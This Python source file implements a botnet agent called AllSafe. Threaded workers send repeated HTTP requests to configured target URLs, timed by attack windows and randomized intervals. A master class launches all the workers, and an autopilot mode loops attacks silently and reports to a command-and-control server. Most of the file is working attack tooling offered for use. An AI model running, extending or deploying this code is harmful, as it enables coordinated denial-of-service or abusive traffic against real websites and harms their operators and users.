"""
This is the script handling the worker of the botnet seen as a single thread. 
The botnet will be made of multiple agents, independent each other, each one
using thread-based parallelism according to the features of their own running machines 
to handle multiple connection to the specified url.

Created:    24 October 2016
Modified:   14 January 2017
"""

import os

from random import randint

from threading import Thread
from multiprocessing import Process, Queue

from datetime import datetime, date
from time import time, sleep as threadSleep

from Request import Request
import requests

from utils.config import validateConfigFile
from utils.log import logInfo, logAttack, logCCUpdate



class AllSafeWorker(Thread):
    def __init__(self, wid, name, config, loglist):
        """
        This class extends the implementation of threading.Thread to handle a HTTP GET request.
        On init we set the thread identifier and we call the super class method.

        @param: wid, integer - the worker unique identifier 
        @param: name, alphanumeric string - the thread unique name
        @param: config, dictionary - the configuration parameter for this thread
        @param: loglist, list - the logging dictionary from master to store calls and results
        """
        # calling superclass init method
        Thread.__init__(self)
        # setting up threading attribute
        self._wid     = wid
        self._name    = name
        # setting up connection parameters from dictionary
        # configuration - connection
        self._request = config['request_params']
        # configuration - periodicity and sessions
        self._period = config['period']
        try:
            self._maxcount = int(config['max_count'])
        except ValueError:
            raise Exception("WORKER"+str(wid)+"- Invalid configuration for worker - maxcount not properly formatted")
        # configuration - action 
        self._action   = config['action_conditions']

        # logging
        self._loglist  = loglist


    def getWorkerTarget(self):
        """
        This method prints out a human readable representation of this worker purpose
        """
        workerTarget  = self.getName()
        workerTarget += " - TARGET: "    + self._request['url']
        workerTarget += " - RESOURCES: " + str(self._request['resources'])
        workerTarget += " - AGENT: "     + self._request['user-agent']
        return workerTarget
    
    def carryAttack(self):
        """ 
        This method can be used to verify if the attack can be carried according the action conditions
        presetted in the config file

        @return: boolean, if the attack can be carried or not
        """
        # retrieving current date and time - it uses UTC based comparison
        today  = date.today()
        utcnow = datetime.utcnow()
        # checking for day 
        if today.month in self._action['avoid_month']:
            return False
        if (today.weekday()+1) in self._action['avoid_week']:
            return False

        # check if there is any particolar attack time (we assume that is can
        # override any specified AM / PM condition)
        if 'attack_time' in self._action:
            attackTime = map((lambda t: int(t)), self._action['attack_time'].split("-"))
            attackTime = list(attackTime)
            return min(attackTime) <= utcnow.hour <= max(attackTime)
            
        # or check for AM / PM 
        if self._action['AM'] and self._action['PM']:
            return True
        if self._action['AM']:
            return 0 < utcnow.hour <= 12
        if self._action['PM']:
            return 12 < utcnow.hour <= 24


    def run(self):
        """ 
        This method is the one executed by the worker thread when it is started by the master thread.
        It check if it is possible to carry the attack, then start performing requests, carrying it on
        according to the configuration file.
        """
        
        # the botnet awaits until it can carry the attack at least once (aggressive behaviour)
        while True:
            # check if the attack can be carried on
            greenlight = self.carryAttack()

            if greenlight:
                # debug purposes... #TODO to be removed
                print("Worker", self.getName(), "greenlight: " + str(greenlight))
                # performing the attack
                for i in range(0, self._maxcount):
                    # instantiate request class
                    req = Request(self._request)
                    # running request object
                    try:
                        req.perform()
                    except requests.exceptions.ConnectionError as ce:
                        # a connection error occured during request performing!
                        self._loglist.append((time(),"Connection Error occurred with value: " + str(ce)))
                        continue
                    except requests.exceptions.Timeout as to:
                        # a timeout error occured during request performing!
                        self._loglist.append((time(),"Connection Timed out. Value: " + str(to)))
                        continue
                    except requests.exceptions.URLRequired as ur:
                        self._loglist.append((time(), "Invalid URL provided: " + str(ur)))
                        break
                    except requests.exceptions.RequestException as re:
                        # a not specific error occured!
                        error = True
                        self._loglist.append((time(),"Generic error occured: " + str(re)))
                        continue

                    # storing the value for logging feature in a tuple (timestamp, data)
                    attackData = self.getWorkerTarget()
                    self._loglist.append((time(), attackData))

                    # thread safe sleeping for the specified interval
                    if len(self._period) == 1:
                        threadSleep(self._period[0])
                    else:
                        threadSleep(randint(min(self._period), max(self._period)))
                
                # exiting from while loop when attack has been carried max_count times (min. 1)
                break
            

class AllSafeWorkerMaster():
    def __init__(self, config_file, override=False):
        """
        This class represents the botnet master as the thread who is in command to launch every 
        thread execution in order to fulfill botnet requiremets. It accepts a configuration file
        as main 

        @param: config_file, filename - path for the configuration file
        @param: override, boolean - optional param to set the botnet in override mode (params set by GUI)
        """
        # parsing the configuration file to return a configuration dictionary
        try:
            self._configuration = validateConfigFile(config_file, override)
        except Exception:
            raise Exception("Configuration file is not properly formatted, or missing schema in /utils directory!")
        if self._configuration == None:
            raise Exception("Configuration file is not properly formatted, or missing schema in /utils directory!")

        # configuring the master
        self._log      = self._configuration["log_file"]
        self._targets  = self._configuration["targets"]

        # initializing workers array
        self._workers = []
        # initializing workers log dictionary
        self._workers_log = dict()

    
    def initializeWorkers(self):
        """
        This method allow the botnet master to create every thread with correct parameters in order
        to correctly execute them.
        """
        
        # logging the initialization routine - start
        logInfo(self._log, "------------------- <SETUP> -------------------")

        for i in range(0, len(self._targets)):
            # iterating over the target list we initialize every worker
            # (s workers for t targets)
            # and their log section 
            for s in range(0, self._targets[i]['sessions']):
                self._workers_log[i + s] = []
                worker = AllSafeWorker(i+s, "worker-t" + str(i) + "-s" + str(s), self._targets[i], self._workers_log[i+s])
                # logging worker reference
                logInfo(self._log, worker.getWorkerTarget())
                self._workers.append(worker)

        # logging the initialization routine - end
        logInfo(self._log, "------------------- </SETUP> -------------------")


    def executeBotnet(self): 
        """
        This method handle the execution of the entire botnet, starting each worker one after one and
        handling the final join operation.
        """

        # recording start time
        start_time = time()

        logInfo(self._log, "------------------- <STARTUP> -------------------")

        # iterating over workers to start them up
        for worker in self._workers:
            # logging the startup routine
            logInfo(self._log, "starting up " + worker.getName() + " ...")
            worker.start()

        logInfo(self._log, "------------------- </STARTUP> -------------------")
        # iterating over worker to join them
        for worker_to_join in self._workers:
            worker_to_join.join()
        
        # recording end time
        end_time = time()

        # logging the attack
        logAttack(self._log, self._workers_log)

        # retrieving statistics
        return {
            "targets" : len(self._targets),
            "workers" : len(self._workers_log.keys()),
            "timing"  : int(end_time - start_time)
        }


class AllSafeBotnet():
    def __init__(self):
        """
        This class represents the core functionalities for the AllSafeBotnet,
        it can be initialized and awaits to be called in order to transfer
        to another process an attack to be carried.
        """
        self._attack_counter  = 0
        # initiliazing botnet client unique id
        self._botnet_identity = str(hash(os.path.expanduser('~')))
        # initializing queue 
        self._botnet_queue    = Queue()
        # botnet instance
        self._botnet_instance = None


    def attack(self, configuration, override=False):
        """
        Method to start a new attack session.
        @param: configuration, string - path to the configuration file
        @return: a tuple (identification, attack_statistics_dictionary, attack_counter)
        """
        self._attack_counter += 1
        self._botnet_instance = self.Botnet(configuration, self._botnet_queue)
        botnet = self._botnet_instance

        botnet.start()
        # retrieving statistics and joining
        attackstats = self._botnet_queue.get()
        botnet.join()
        # returning statistics and counter
        return self._botnet_identity, attackstats, self._attack_counter

    def abort(self):
        """
        Method to abort botnet execution if any is currently operational.
        """
        botnet = self._botnet_instance
        if botnet:
            if botnet.is_alive():
                botnet.terminate()
                self._botnet_queue = Queue()

    def autopilot(self, server, configuration, timer, override=False):
        """
        Method to start a new attack session silently... with autopilot inserted.
        Note: no runtime logging or stats are enabled!
        @param: server, string - C&C remote address
        @param: configuration, string - path to the configuration file
        @param: timer, int - time interval in seconds between each iteration
        """
        # verify C&C
        up = True
        if not override:
            up = logCCUpdate(server, self._botnet_identity, "starting up in autopilot mode - timing " + int(timer))
        else:
            up = False

        while True:
            # attacking using configuration provided 
            # or checking for C&C updated configuration
            attackres = self.attack(configuration, override=up)
            # updating C&C and its connection status
            if up:
                up = logCCUpdate(server, attackres[0], attackres[1])
            # sleeping
            threadSleep(timer)
            



    class Botnet(Process):
        def __init__(self, configuration, queue, name='AllSafeBotnetInstance', override=False):
            super().__init__(name=name)
            self._queue          = queue
            self._configuration  = configuration
            self._override_conf  = override
            # initialize master
            self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)

        def run(self):
            # starting the attack
            self._allsafe_master.initializeWorkers()
            stat = self._allsafe_master.executeBotnet()
            self._queue.put(stat)


        

if __name__ == "__main__":
    # init botnet 
    allsafe = AllSafeBotnet()
    # attack (you can specify each time a different configuration file)
    # note that you can override the configuration check from C&C 
    # it can raise an exception in case of failure
    allsafe.attack('./utils/config_schema_example.json', override=False)